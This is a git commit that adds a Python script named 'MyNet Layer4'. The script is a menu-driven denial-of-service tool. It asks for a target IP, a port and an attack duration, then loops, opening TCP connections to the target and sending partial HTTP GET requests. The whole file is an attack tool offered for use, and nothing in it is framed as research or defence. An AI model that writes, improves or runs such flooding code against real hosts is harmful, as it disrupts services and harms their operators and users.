10931d2835c61da541d181c8bc1c53d5e3152481
Lemonaidd <lemon.cookier@gmail.com>
2025-07-12 15:28:06 -0600

    Add files via upload

---
+++ myNetl4.py
@@ -0,0 +1,62 @@
+import socket
+import threading
+import time
+import random
+import os
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_menu():
+    clear_screen()
+    print("\033[1;35m" + r"""
+    Made by: Lemonaidd
+
+ ███▄ ▄███▓▓██   ██▓    ███▄    █ ▓█████▄▄▄█████▓
+▓██▒▀█▀ ██▒ ▒██  ██▒    ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
+▓██    ▓██░  ▒██ ██░   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
+▒██    ▒██   ░ ▐██▓░   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
+▒██▒   ░██▒  ░ ██▒▓░   ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
+░ ▒░   ░  ░   ██▒▒▒    ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
+░  ░      ░ ▓██ ░▒░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
+░      ░    ▒ ▒ ░░        ░   ░ ░    ░    ░      
+       ░    ░ ░                 ░    ░  ░        
+            ░ ░                                  
+    """ + "\033[0m")
+    print("\033[1;36m" + "MyNet Layer4" + "\033[0m")
+    print("\033[1;32m" + "1. Attack IP" + "\033[0m")
+    print("\033[1;32m" + "2. Exit" + "\033[0m")
+
+def send_requests(target_ip, target_port, duration):
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target_ip, target_port))
+            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
+            print("\033[1;35m" + f"-GET Request sent to:{target_ip}:{target_port}" + "\033[0m")
+            sock.close()
+        except Exception as e:
+            print("\033[1;31m" + f"Error: {e}" + "\033[0m")
+
+def start_attack():
+    target_ip = input("\033[1;32mEnter target IP: \033[0m")
+    target_port = int(input("\033[1;32mEnter target Port: \033[0m"))
+    duration = int(input("\033[1;32mEnter attack duration in seconds: \033[0m"))
+    print("\033[1;32m" + "Attack starting..." + "\033[0m")
+    threading.Thread(target=send_requests, args=(target_ip, target_port, duration)).start()
+
+def main():
+    while True:
+        print_menu()
+        choice = input("\033[1;37mSelect an option: \033[0m")
+        if choice == '1':
+            start_attack()
+        elif choice == '2':
+            print("\033[1;31mExiting...\033[0m")
+            break
+        else:
+            print("\033[1;31mInvalid option, please try again.\033[0m")
+
+if __name__ == "__main__":
+    main()
